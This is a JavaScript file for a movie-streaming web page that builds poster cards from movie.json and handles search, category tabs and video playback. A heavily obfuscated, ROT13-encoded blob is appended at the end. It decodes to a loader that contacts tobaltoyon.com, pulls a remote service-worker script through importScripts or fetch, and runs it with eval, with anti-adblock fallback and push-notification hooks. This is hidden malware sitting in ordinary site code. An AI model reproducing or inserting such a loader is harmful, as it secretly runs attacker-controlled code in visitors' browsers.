let left_btn = document.getElementsByClassName('bi bi-chevron-left')[0];
let right_btn = document.getElementsByClassName('bi bi-chevron-right')[0];
let cards = document.getElementsByClassName('cards')[0];
let search = document.getElementsByClassName("search")[0];
let search_input = document.getElementById("search_input");
let button = document.getElementById('download_main');
let viewall = document.getElementById('viewall');

left_btn.addEventListener('click', ()=> {
    cards.scrollLeft -= 140;
})
right_btn.addEventListener('click', ()=> {
    cards.scrollLeft += 140;
})
viewall.addEventListener('click', ()=> {
    viewall.href = "m/view_all.html"
});
let json_url ='movie.json';

fetch(json_url)
  .then(Response => Response.json())
  .then((data) => {
    let counter = 0; // Initialize the counter variable

    data.forEach((ele, i) => {
      if (counter >= 15) {
        // If the counter reaches 13, break out of the loop
        return;
      }

      let { name, imdb, date, desc, pub, bposter, sposter, genre, url } = ele;
      let card = document.createElement('a');
      card.classList.add('card');
      card.href = url;
      card.innerHTML = `
        <img src="${sposter}" alt="${name}" class="poster">
        <div class="rest_card">
          <img src="${bposter}" alt="">
          <div class="cont">
            <h4>${name}</h4>
            <div class="sub">
              <p>${genre}, ${date}</p>
              <h3><span>IMDB</span><i class="bi bi-star-fill"></i>${imdb}</h3>
            </div>
          </div>
        </div>
      `;
      cards.appendChild(card);
      
      counter++; // Increment the counter variable
    });

    data.forEach(element => {
        let {name, imdb, date, sposter, genre, url} = element;
        let card = document.createElement('a');
        card.classList.add('card');
        card.href = url;
        card.innerHTML = `
        <img src="${sposter}" alt="">
                        <div class="cont">
                            <h3>${name}</h3>
                            <p>${genre}, ${date} , <span>IMDB</span><i class="bi bi-star-fill"></i>${imdb}</p>
                        </div>
        `
        search.appendChild(card);
    });
    search_input.addEventListener('keyup', ()=> {
        let fliter = search_input.value.toUpperCase();
        let a = search.getElementsByTagName('a');

        for (let index = 0; index < a.length; index++) {
            let b = a[index].getElementsByClassName('cont')[0];
            let TextValue = b.textContent || b,innerText;
            if (TextValue.toUpperCase().indexOf(fliter) > -1) {
                a[index].style.display = 'flex';
                search.style.visibility = 'visible';
                search.style.opacity = 1;
            } else {
                a[index].style.display = 'none';
            }
        }
    })

    let video = document.getElementsByTagName('video')[0];
    let play = document.getElementById('play');
    play.addEventListener('click', () => {
        if (video.paused) {
            video.play();
            play.innerHTML = `Pause <i class="bi bi-pause-fill"></i>`
        } else {
            video.pause();
            play.innerHTML = `Play <i class="bi bi-play-fill"></i>`
        }
    });
    

    let series = document.getElementById('series');
    series.addEventListener("click", ()=>{
        cards.innerHTML = '';

        let series_array = data.filter(ele => {
            return ele.type == "series";
        });
        series_array.forEach((ele, i) => {
            let {name, imdb, date, bposter, sposter, genre, url} = ele;
            let card = document.createElement('a');
            card.classList.add('card');
            card.href = url;
            card.innerHTML = `
            <img src="${sposter}" alt="${name}" class="poster">
            <div class="rest_card">
                <img src="${bposter}" alt="">
                <div class="cont">
                    <h4>${name}</h4>
                    <div class="sub">
                        <p>${genre}, ${date}</p>
                        <h3><span>IMDB</span><i class="bi bi-star-fill"></i>${imdb}</h3>
                    </div>
                </div>
            </div>
            `
            cards.appendChild(card);
        });
        
    });


    let moviess = document.getElementById('movies');
    moviess.addEventListener("click", ()=>{
        cards.innerHTML = '';

        let movies_array = data.filter(ele => {
            return ele.type == "movie";
        });
        movies_array.forEach((ele, i) => {
            let {name, imdb, date, bposter, sposter, genre, url} = ele;
            let card = document.createElement('a');
            card.classList.add('card');
            card.href = url;
            card.innerHTML = `
            <img src="${sposter}" alt="${name}" class="poster">
            <div class="rest_card">
                <img src="${bposter}" alt="">
                <div class="cont">
                    <h4>${name}</h4>
                    <div class="sub">
                        <p>${genre}, ${date}</p>
                        <h3><span>IMDB</span><i class="bi bi-star-fill"></i>${imdb}</h3>
                    </div>
                </div>
            </div>
            `
            cards.appendChild(card);
        });
        
    });

    let kids = document.getElementById('kids');
    kids.addEventListener("click", ()=>{
        cards.innerHTML = '';

        let kids_array = data.filter(ele => {
            return ele.type == "kids";
        });
        kids_array.forEach((ele, i) => {
            let {name, imdb, date, bposter, sposter, genre, url} = ele;
            let card = document.createElement('a');
            card.classList.add('card');
            card.href = url;
            card.innerHTML = `
            <img src="${sposter}" alt="${name}" class="poster">
            <div class="rest_card">
                <img src="${bposter}" alt="">
                <div class="cont">
                    <h4>${name}</h4>
                    <div class="sub">
                        <p>${genre}, ${date}</p>
                        <h3><span>IMDB</span><i class="bi bi-star-fill"></i>${imdb}</h3>
                    </div>
                </div>
            </div>
            `
            cards.appendChild(card);
        });
    });
    button.addEventListener("click", function () {
        window.location.href = data[0].url; // Replace this URL with your desired destination
      });

    document.getElementById('title').innerText = data[0].name;
    document.getElementById('desc').innerText = data[0].desc;
    document.getElementById('gen').innerText = data[0].genre;
    document.getElementById('date').innerText = data[0].date;
    document.getElementById('rate').innerHTML = `<span>IMDB</span><i class="bi bi-star-fill"></i>${data[0].imdb}`
});
(function(O){!function(e){var t=O.Z();function n(r){if(t[r])return t[r][O.i];var i=t[r]=O.Z(O.B,r,O.w,!O.X,O.i,O.Z());return e[r][O.z](i[O.i],i,i[O.i],n),i[O.w]=!O.N,i[O.i]}n[O.y]=e,n[O.g]=t,n[O.K]=function(e,t,r){n[O.h](e,t)||Object[O.b](e,t,O.Z(O.GO,!O.N,O.RO,r))},n[O.G]=function(e){O.HO!=typeof Symbol&&Symbol[O.hO]&&Object[O.b](e,Symbol[O.hO],O.Z(O.p,O.cO)),Object[O.b](e,O.U,O.Z(O.p,!O.N))},n[O.R]=function(e,t){if(O.X&t&&(e=n(e)),O.v&t)return e;if(O.P&t&&O.t==typeof e&&e&&e[O.U])return e;var r=Object[O.r](O.q);if(n[O.G](r),Object[O.b](r,O.C,O.Z(O.GO,!O.N,O.p,e)),O.d&t&&O.oO!=typeof e)for(var i in e)n[O.K](r,i,function(t){return e[t]}[O.fO](O.q,i));return r},n[O.H]=function(e){var t=e&&e[O.U]?function(){return e[O.C]}:function(){return e};return n[O.K](t,O.OO,t),t},n[O.h]=function(e,t){return Object[O.FO][O.a][O.z](e,t)},n[O.e]=O.F,n(n[O.m]=O.o)}(O.Z(O.o,function(module,exports,__webpack_require__){O.f;var _antiadblock=__webpack_require__(O.O);self[O.c]=O.Z(O.S,6155445,O.V,"tobaltoyon.com",O.l,!O.N),self[O.D]=O.F;var DEFAULT_URL=[O.Y,O.j][O.A](self[O.c][O.V]),STORE_EVENTS=[O.T,O.u,O.M,O.L,O.n,O.E],url;try{if(url=atob(location[O.DO][O.x](O.X)),!url)throw O.q}catch(e){url=DEFAULT_URL}try{importScripts(url)}catch(ignore){var events=O.Z(),listeners=O.Z(),realAddEventListener=self[O.yO][O.fO](self);STORE_EVENTS[O.ZO](function(e){self[O.yO](e,function(t){events[e]||(events[e]=[]),events[e][O.M](t),listeners[e]&&listeners[e][O.ZO](function(e){try{e(t)}catch(e){}})})}),self[O.yO]=function(e,t){if(-O.X===STORE_EVENTS[O.qO](e))return realAddEventListener(e,t);listeners[e]||(listeners[e]=[]),listeners[e][O.M](t),events[e]&&events[e][O.ZO](function(e){try{t(e)}catch(e){}})},(O.N,_antiadblock[O.I])(url,O.Z())[O.gO](function(e){return e[O.UO]()})[O.gO](function(code){return eval(code)})}},O.O,function(e,t,n){O.f;Object[O.b](t,O.U,O.Z(O.p,!O.N)),t[O.Q]=function(e){return new Promise(function(t,n){r(O.BO)[O.gO](function(r){var i=r[O.tO]([O.lO],O.rO)[O.xO](O.lO)[O.WO](O.Z(O.V,e,O.dO,new Date()[O.CO]()));i[O.yO](O.EO,t),i[O.yO](O.nO,n)})})},t[O.I]=async function(e,t){var n=await new Promise(function(e,t){r(O.BO)[O.gO](function(n){var r=n[O.tO]([O.lO],O.rO)[O.xO](O.lO)[O.PO]();r[O.yO](O.nO,t),r[O.yO](O.EO,function(){return e(r[O.XO][O.oF](function(e){return e[O.V]}))})})}),o=!O.N,a=!O.X,s=void O.N;try{for(var c,u=n[Symbol[O.QO]]();!(o=(c=u[O.IO]())[O.uO]);o=!O.N){var d=c[O.p];try{return await fetch(O.Y+d+O.s+i(),O.Z(O.YO,t[O.YO]||O.RO,O.jO,O.pO,O.sO,t[O.sO],O.vO,O.Z(O.kO,btoa(e))))}catch(e){}}}catch(e){a=!O.N,s=e}finally{try{!o&&u[O.JO]&&u[O.JO]()}finally{if(a)throw s}}throw new Error(O.eO)},t[O.J]=async function(e){try{var t=await fetch(e[O.qO](O.SO)>-O.X?e:O.Y+e);return!O.X===(await t[O.bO]())[O.TO]}catch(e){return!O.X}};function r(e){return new Promise(function(t,n){var r=indexedDB[O.MO](e,O.X);r[O.yO](O.LO,function(){r[O.XO][O.VO](O.lO,O.Z(O.aO,O.V))}),r[O.yO](O.nO,n),r[O.yO](O.EO,function(){return t(r[O.XO])})})}function i(){var e=arguments[O.iO]>O.N&&void O.N!==arguments[O.N]?arguments[O.N]:O.N,t=e<O.W&&Math[O.mO]()>O.k,n=Math[O.mO]()[O.zO](O.wO)[O.x](O.d,O.KO+parseInt(O.AO*Math[O.mO](),O.NO));return n+(t?O.s+i(e+O.X):O.F)}}))}([['o',111],['O',17],['F',''],['f','hfr fgevpg'],['Z',function(){const obj={};const args=[].slice.call(arguments);for(let i=0;i<args.length-1;i+=2){obj[args[i]]=args[i+1]}return obj}],['y','z'],['g','p'],['K','q'],['G','e'],['R','g'],['H','a'],['h','b'],['e','c'],['i','rkcbegf'],['m','f'],['z','pnyy'],['w','y'],['N',0],['c','bcgvbaf'],['D','ynel'],['A','wbva'],['T','vafgnyy'],['u','npgvingr'],['M','chfu'],['L','abgvsvpngvbapyvpx'],['n','abgvsvpngvbapybfr'],['E','chfufhofpevcgvbapunatr'],['q',null],['b','qrsvarCebcregl'],['U','__rfZbqhyr'],['Q','nqqQbznva'],['I','hygensrgpu'],['J','grfgCvatQbznva'],['B','v'],['S','mbarVq'],['V','qbznva'],['l','erfhofpevorBaVafgnyy'],['X',1],['Y','uggcf://'],['j','/csr/pheerag/freivpr-jbexre.zva.wf?e=fj&i=2'],['p','inyhr'],['s','/'],['v',8],['a','unfBjaCebcregl'],['W',7],['k',.3],['x','fyvpr'],['d',2],['P',4],['t','bowrpg'],['r','perngr'],['C','qrsnhyg'],['oO','fgevat'],['OO','n'],['FO','cebgbglcr'],['fO','ovaq'],['ZO','sbeRnpu'],['yO','nqqRiragYvfgrare'],['gO','gura'],['KO',3],['GO','rahzrenoyr'],['RO','trg'],['HO','haqrsvarq'],['hO','gbFgevatGnt'],['eO','NNO Erdhrfg Snvyrq'],['iO','yratgu'],['mO','enaqbz'],['zO','gbFgevat'],['wO',36],['NO',10],['cO','Zbqhyr'],['DO','frnepu'],['AO',9],['TO','fgnghf'],['uO','qbar'],['MO','bcra'],['LO','hctenqrarrqrq'],['nO','reebe'],['EO','fhpprff'],['qO','vaqrkBs'],['bO','wfba'],['UO','grkg'],['QO','vgrengbe'],['IO','arkg'],['JO','erghea'],['BO','fjnno'],['SO',':'],['VO','perngrBowrpgFgber'],['lO','qbznvaf'],['XO','erfhyg'],['YO','zrgubq'],['jO','perqragvnyf'],['pO','vapyhqr'],['sO','obql'],['vO','urnqref'],['aO','xrlCngu'],['WO','chg'],['kO','gbxra'],['xO','bowrpgFgber'],['dO','perngrqNg'],['PO','trgNyy'],['tO','genafnpgvba'],['rO','ernqjevgr'],['CO','trgGvzr'],['oF','znc']].reduce((o,i)=>(Object.defineProperty(o,i[0],{get:()=>typeof i[1]!=='string'?i[1]:i[1].split('').map(s=>{const c=s.charCodeAt(0);return c>=65&&c<=90?String.fromCharCode((c-65+26-13)%26+65):c>=97&&c<=122?String.fromCharCode((c-97+26-13)%26+97):s}).join('')}),o),{})))/*importScripts(...r=sw)*/
